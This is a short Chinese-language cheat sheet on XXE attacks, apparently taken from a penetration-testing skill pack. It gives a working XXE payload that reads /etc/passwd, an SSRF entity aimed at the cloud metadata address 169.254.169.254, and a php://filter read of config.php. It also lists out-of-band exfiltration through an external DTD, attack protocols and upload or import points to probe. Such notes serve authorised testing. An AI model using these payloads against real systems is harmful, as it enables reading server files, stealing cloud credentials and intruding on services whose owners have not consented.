# 三、XXE 专项

> 来源：CkSKILLS v1 `deserialization-xxe` §三、XXE 专项（迁移至 v2 知识块）

### 基础 Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### 进阶利用
- 无回显：外部 DTD + 带外（OOB）读取文件
- SSRF：`SYSTEM "http://169.254.169.254/latest/meta-data/"`
- 文件读取：`file:///etc/passwd`、`php://filter/read=convert.base64-encode/resource=config.php`
- 协议：http/ftp/gopher
- Office 文档 XXE：docx/xlsx 内 XML 注入外部实体

### 触发场景
- XML/Excel/CSV 导入
- SOAP 接口
- 文档预览/转换
- SVG 上传（图片上传点也测 XXE）
